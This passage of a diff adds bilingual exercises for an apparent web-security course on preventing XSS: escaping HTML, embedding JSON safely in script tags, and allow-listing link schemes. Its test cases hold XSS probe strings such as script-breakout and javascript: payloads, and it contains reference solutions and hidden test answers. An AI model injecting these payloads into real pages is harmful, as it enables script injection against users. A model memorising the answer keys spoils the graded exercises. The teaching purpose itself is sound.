(b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "&amp;lt;already&amp;gt;",
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 5",
+              "vi": "Ca ẩn 5"
+            },
+            "goi": "[escapeHtml(42), escapeHtml(null), escapeHtml(\"it's \\\"quoted\\\"\")]",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": [
+              "42",
+              "null",
+              "it&#39;s &quot;quoted&quot;"
+            ],
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 6",
+              "vi": "Ca ẩn 6"
+            },
+            "goi": "escapeHtml('<scr<script>ipt>alert(1)</scr</script>ipt>')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;",
+            "an": true
+          }
+        ]
+      },
+      "gradeKind": "js",
+      "kind": "practice",
+      "mistakesJson": [
+        {
+          "loi": "Escaping <code>&amp;</code> last: <code>&lt;</code> becomes <code>&amp;amp;lt;</code> and the page shows the literal \"&amp;lt;\".|||Escape <code>&amp;</code> sau cùng: <code>&lt;</code> thành <code>&amp;amp;lt;</code> và trang hiện nguyên chữ \"&amp;lt;\"."
+        },
+        {
+          "loi": "<code>s.replace(\"&lt;\", \"&amp;lt;\")</code> with a string pattern only replaces the FIRST one.|||<code>s.replace(\"&lt;\", \"&amp;lt;\")</code> với mẫu là chuỗi chỉ thay cái ĐẦU TIÊN."
+        },
+        {
+          "loi": "Skipping quotes: escaped text placed inside <code>title=\"…\"</code> can still break out of the attribute.|||Bỏ qua dấu nháy: chữ đã escape đặt trong <code>title=\"…\"</code> vẫn thoát được khỏi thuộc tính."
+        }
+      ],
+      "glossaryJson": [
+        {
+          "en": "entity",
+          "vi": "thực thể HTML",
+          "giaiThich": "&lt; &gt; &amp; &quot; &#39;"
+        },
+        {
+          "en": "context",
+          "vi": "ngữ cảnh",
+          "giaiThich": "nơi dữ liệu được đặt: chữ, thuộc tính, script…"
+        }
+      ]
+    },
+    {
+      "title": "Embed server data in a page without breaking out of <script>",
+      "language": "javascript",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 15,
+      "points": 20,
+      "concepts": [
+        "XSS",
+        "escaping contexts"
+      ],
+      "prerequisites": [],
+      "tags": [
+        "nodejs"
+      ],
+      "problemHtml": "<p>Way #3 that XSS comes back: <code>&lt;script&gt;window.__DATA__ = {\"bio\":\"…\"}&lt;/script&gt;</code> breaks the moment a value contains <code>&lt;/script&gt;</code> — \"no matter how valid the JSON is\". Write <code>embedData(data)</code> that returns exactly</p>\n<pre>&lt;script&gt;window.__DATA__ = &lt;json&gt;;&lt;/script&gt;</pre>\n<p>where <code>&lt;json&gt;</code> is <code>JSON.stringify(data)</code> with every <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> written as <code>\\u003c</code>, <code>\\u003e</code>, <code>\\u0026</code> (and U+2028 / U+2029 as <code>\\u2028</code> / <code>\\u2029</code>). The result must still parse back to the same data, and the only <code>&lt;/script</code> in the output must be the closing tag you add.</p><p><i>Graded in your browser: there is no real Express, network, Buffer or <code>crypto</code> here. The tests call your function with small fake objects (a fake <code>res</code> that records <code>status()</code>, headers and <code>json()</code>; fake stores with async methods), exactly the way Chapter 14 tests a handler without a server. <code>Date.now()</code> and timers run on a virtual clock, so waiting costs no real time.</i></p>\n<h4>Requirements</h4>\n<ul>\n  <li>Return the value; do not print it.</li>\n  <li>Do not modify the arguments.</li>\n</ul>",
+      "problemHtmlVi": "<p>Cách thứ 3 XSS quay lại: <code>&lt;script&gt;window.__DATA__ = {\"bio\":\"…\"}&lt;/script&gt;</code> vỡ ngay khi một giá trị chứa <code>&lt;/script&gt;</code> — \"JSON hợp lệ tới đâu cũng vậy\". Viết <code>embedData(data)</code> trả về đúng</p>\n<pre>&lt;script&gt;window.__DATA__ = &lt;json&gt;;&lt;/script&gt;</pre>\n<p>trong đó <code>&lt;json&gt;</code> là <code>JSON.stringify(data)</code> với mọi <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> viết thành <code>\\u003c</code>, <code>\\u003e</code>, <code>\\u0026</code> (và U+2028 / U+2029 thành <code>\\u2028</code> / <code>\\u2029</code>). Kết quả vẫn phải đọc lại ra đúng dữ liệu, và <code>&lt;/script</code> duy nhất trong output là thẻ đóng bạn thêm vào.</p><p><i>Chấm ngay trong trình duyệt: ở đây không có Express thật, mạng, Buffer hay <code>crypto</code>. Bộ kiểm gọi hàm của bạn với các object GIẢ nhỏ (một <code>res</code> giả ghi lại <code>status()</code>, header và <code>json()</code>; kho giả có hàm async), đúng cách Chương 14 kiểm một handler mà không cần máy chủ. <code>Date.now()</code> và hẹn giờ chạy trên đồng hồ ẢO nên chờ không tốn thời gian thật.</i></p>\n<h4>Yêu cầu</h4>\n<ul>\n  <li>Trả về giá trị, đừng in ra.</li>\n  <li>Không sửa các đối số.</li>\n</ul>",
+      "inputSpec": null,
+      "outputSpec": null,
+      "constraints": "",
+      "examplesJson": [
+        {
+          "input": "embedData({ bio: '</script><script>alert(1)</script>' })",
+          "output": "\"<script>window.__DATA__ = {\\\"bio\\\":\\\"\\\\u003c/script\\\\u003e\\\\u003cscript\\\\u003ealert(1)\\\\u003c/script\\\\u003e\\\"};</script>\"",
+          "explanation": "The first sample case (more cases run when you press Run; hidden ones only on Submit).|||Ca mẫu đầu tiên (Chạy thử chạy thêm các ca hiện; ca ẩn chỉ chạy khi Nộp)."
+        }
+      ],
+      "hintsJson": [
+        "Stringify first, then replace characters in the JSON text — <code>\\u003c</code> inside a JSON string is the same character to <code>JSON.parse</code>.|||Stringify trước, rồi thay ký tự trong chuỗi JSON — <code>\\u003c</code> trong chuỗi JSON là cùng ký tự đối với <code>JSON.parse</code>.",
+        "In your JavaScript source the replacement is the 6-character text <code>\\\\u003c</code> (backslash written twice).|||Trong mã JavaScript, chuỗi thay thế là 6 ký tự <code>\\\\u003c</code> (dấu gạch ngược viết hai lần)."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "/** Return '<script>window.__DATA__ = <json>;</script>' that cannot be broken out of. */\nfunction embedData(data) {\n  // Write your solution here\n  return '<script>window.__DATA__ = ' + JSON.stringify(data) + ';</script>';\n}\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "// Reference solution\nfunction embedData(data) {\n  // JSON.stringify is valid JSON — and valid JSON can still contain \"</script>\", which ends the <script> block\n  // in the HTML parser no matter what the JavaScript inside means. Escape the characters the HTML parser cares\n  // about as JSON unicode escapes: JSON.parse turns them back into the same characters, the HTML parser never sees them.\n  const json = JSON.stringify(data)\n    .replace(/</g, '\\\\u003c')\n    .replace(/>/g, '\\\\u003e')\n    .replace(/&/g, '\\\\u0026')\n    .replace(/\\u2028/g, '\\\\u2028')   // line separators: legal in JSON, historically illegal in JS string literals\n    .replace(/\\u2029/g, '\\\\u2029');\n  return '<script>window.__DATA__ = ' + json + ';</script>';\n}\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p>The HTML parser ends a script block at the first <code>&lt;/script</code>, before JavaScript ever runs, so the danger is in characters, not in the JSON grammar. Writing them as JSON unicode escapes keeps the data identical (JSON.parse decodes <code>\\u003c</code> to <code>&lt;</code>) while making the text invisible to the HTML parser. It is a different context from the page body, which is why <code>escapeHtml</code> would be wrong here.</p>",
+      "solutionExplanationHtmlVi": "<p>Bộ phân tích HTML kết thúc khối script ở <code>&lt;/script</code> đầu tiên, trước khi JavaScript kịp chạy, nên nguy hiểm nằm ở ký tự, không ở ngữ pháp JSON. Viết chúng thành mã unicode của JSON giữ nguyên dữ liệu (JSON.parse giải <code>\\u003c</code> thành <code>&lt;</code>) mà bộ phân tích HTML không thấy. Đây là ngữ cảnh khác với thân trang, vì vậy dùng <code>escapeHtml</code> ở đây là sai.</p>",
+      "diagramMermaid": null,
+      "referenceUrl": null,
+      "testsJson": {
+        "loai": "js",
+        "phienBan": 1,
+        "tepChinh": "answer.js",
+        "tepNap": [
+          "answer.js"
+        ],
+        "kiem": [
+          {
+            "moTa": {
+              "en": "A bio that tries to close the script",
+              "vi": "Tiểu sử cố đóng khối script"
+            },
+            "goi": "embedData({ bio: '</script><script>alert(1)</script>' })",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<script>window.__DATA__ = {\"bio\":\"\\u003c/script\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"};</script>"
+          },
+          {
+            "moTa": {
+              "en": "Harmless data is unchanged except for the wrapper",
+              "vi": "Dữ liệu vô hại giữ nguyên, chỉ thêm vỏ"
+            },
+            "goi": "embedData({ user: 'An', notes: 3 })",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<script>window.__DATA__ = {\"user\":\"An\",\"notes\":3};</script>"
+          },
+          {
+            "moTa": {
+              "en": "Exactly one \"</script\" (yours)",
+              "vi": "Đúng một \"</script\" (của bạn)"
+            },
+            "goi": "(() => { const out = embedData({ bio: '</SCRIPT><img src=x onerror=alert(1)>' }); return out.toLowerCase().split('</script').length - 1; })()",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": 1
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 4",
+              "vi": "Ca ẩn 4"
+            },
+            "goi": "(() => { const d = { bio: 'a</script>&<!--', tags: ['<b>', '\\u2028'] }; const out = embedData(d); const json = out.slice('<script>window.__DATA__ = '.length, -';</script>'.length); return [JSON.stringify(JSON.parse(json)) === JSON.stringify(d), /[<>&\\u2028]/.test(json)]; })()",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": [
+              true,
+              false
+            ],
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 5",
+              "vi": "Ca ẩn 5"
+            },
+            "goi": "embedData(['<!--', 'x & y', null])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<script>window.__DATA__ = [\"\\u003c!--\",\"x \\u0026 y\",null];</script>",
+            "an": true
+          }
+        ]
+      },
+      "gradeKind": "js",
+      "kind": "practice",
+      "mistakesJson": [
+        {
+          "loi": "HTML-escaping the JSON (<code>&amp;lt;</code>): inside &lt;script&gt; entities are not decoded, so the data arrives as the literal text \"&amp;lt;\".|||Escape kiểu HTML cho JSON (<code>&amp;lt;</code>): trong &lt;script&gt; thực thể không được giải mã nên dữ liệu tới tay là chữ \"&amp;lt;\"."
+        },
+        {
+          "loi": "Escaping only the first <code>&lt;</code> — replace with a string pattern.|||Chỉ thay <code>&lt;</code> đầu tiên — replace với mẫu là chuỗi."
+        },
+        {
+          "loi": "Writing <code>\"\\u003c\"</code> with one backslash: that IS the character &lt; again.|||Viết <code>\"\\u003c\"</code> với một dấu gạch ngược: đó lại CHÍNH là ký tự &lt;."
+        }
+      ],
+      "glossaryJson": [
+        {
+          "en": "script context",
+          "vi": "ngữ cảnh script",
+          "giaiThich": "dữ liệu nằm trong khối &lt;script&gt;"
+        },
+        {
+          "en": "unicode escape",
+          "vi": "mã thoát unicode",
+          "giaiThich": "\\u003c — cách JSON viết ký tự &lt;"
+        }
+      ]
+    },
+    {
+      "title": "A link built from user data must not run code",
+      "language": "javascript",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 15,
+      "points": 20,
+      "concepts": [
+        "XSS",
+        "URL parsing",
+        "allow-list"
+      ],
+      "prerequisites": [],
+      "tags": [
+        "nodejs"
+      ],
+      "problemHtml": "<p>Way #4 that XSS comes back: \"an <code>href</code> assembled by string concatenation accepts <code>javascript:</code> just fine\" — and real sanitizers turned <code>&lt;a href=\"javascript:alert(1)\"&gt;</code> into a bare <code>&lt;a&gt;</code>. Write <code>safeHref(href)</code>:</p>\n<ul><li>return <code>href</code> unchanged if, parsed as a URL relative to <code>https://cuongthai.com/</code>, its protocol is <code>http:</code>, <code>https:</code> or <code>mailto:</code> (so <code>/notes/1</code> and <code>#top</code> are fine);</li>\n<li>otherwise return <code>\"#\"</code> — including <code>JaVaScRiPt:</code>, <code>\" \\tjavascript:\"</code>, <code>java\\tscript:</code>, <code>data:</code> and anything the URL parser rejects.</li></ul><p><i>Graded in your browser: there is no real Express, network, Buffer or <code>crypto</code> here. The tests call your function with small fake objects (a fake <code>res</code> that records <code>status()</code>, headers and <code>json()</code>; fake stores with async methods), exactly the way Chapter 14 tests a handler without a server. <code>Date.now()</code> and timers run on a virtual clock, so waiting costs no real time.</i></p>\n<h4>Requirements</h4>\n<ul>\n  <li>Return the value; do not print it.</li>\n  <li>Do not modify the arguments.</li>\n</ul>",
+      "problemHtmlVi": "<p>Cách thứ 4 XSS quay lại: \"một <code>href</code> ghép bằng nối chuỗi nhận <code>javascript:</code> ngon lành\" — và các bộ sanitize thật đã biến <code>&lt;a href=\"javascript:alert(1)\"&gt;</code> thành <code>&lt;a&gt;</code> trơn. Viết <code>safeHref(href)</code>:</p>\n<ul><li>trả nguyên <code>href</code> nếu, khi phân tích thành URL tương đối với <code>https://cuongthai.com/</code>, giao thức của nó là <code>http:</code>, <code>https:</code> hoặc <code>mailto:</code> (nên <code>/notes/1</code> và <code>#top</code> được);</li>\n<li>ngược lại trả <code>\"#\"</code> — kể cả <code>JaVaScRiPt:</code>, <code>\" \\tjavascript:\"</code>, <code>java\\tscript:</code>, <code>data:</code> và mọi thứ bộ phân tích URL từ chối.</li></ul><p><i>Chấm ngay trong trình duyệt: ở đây không có Express thật, mạng, Buffer hay <code>crypto</code>. Bộ kiểm gọi hàm của bạn với các object GIẢ nhỏ (một <code>res</code> giả ghi lại <code>status()</code>, header và <code>json()</code>; kho giả có hàm async), đúng cách Chương 14 kiểm một handler mà không cần máy chủ. <code>Date.now()</code> và hẹn giờ chạy trên đồng hồ ẢO nên chờ không tốn thời gian thật.</i></p>\n<h4>Yêu cầu</h4>\n<ul>\n  <li>Trả về giá trị, đừng in ra.</li>\n  <li>Không sửa các đối số.</li>\n</ul>",
+      "inputSpec": null,
+      "outputSpec": null,
+      "constraints": "",
+      "examplesJson": [
+        {
+          "input": "safeHref('https://cuongthai.com/notes/7')",
+          "output": "\"https://cuongthai.com/notes/7\"",
+          "explanation": "The first sample case (more cases run when you press Run; hidden ones only on Submit).|||Ca mẫu đầu tiên (Chạy thử chạy thêm các ca hiện; ca ẩn chỉ chạy khi Nộp)."
+        }
+      ],
+      "hintsJson": [
+        "<code>new URL(href, base)</code> parses like a browser: it lower-cases the scheme and removes the spaces and tabs a browser would ignore.|||<code>new URL(href, base)</code> phân tích như trình duyệt: viết thường scheme và bỏ dấu cách, tab mà trình duyệt bỏ qua.",
+        "Wrap it in try/catch — <code>new URL(\"http://\")</code> throws. Then compare <code>url.protocol</code> with an allow-list.|||Bọc trong try/catch — <code>new URL(\"http://\")</code> ném lỗi. Rồi so <code>url.protocol</code> với danh sách trắng."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
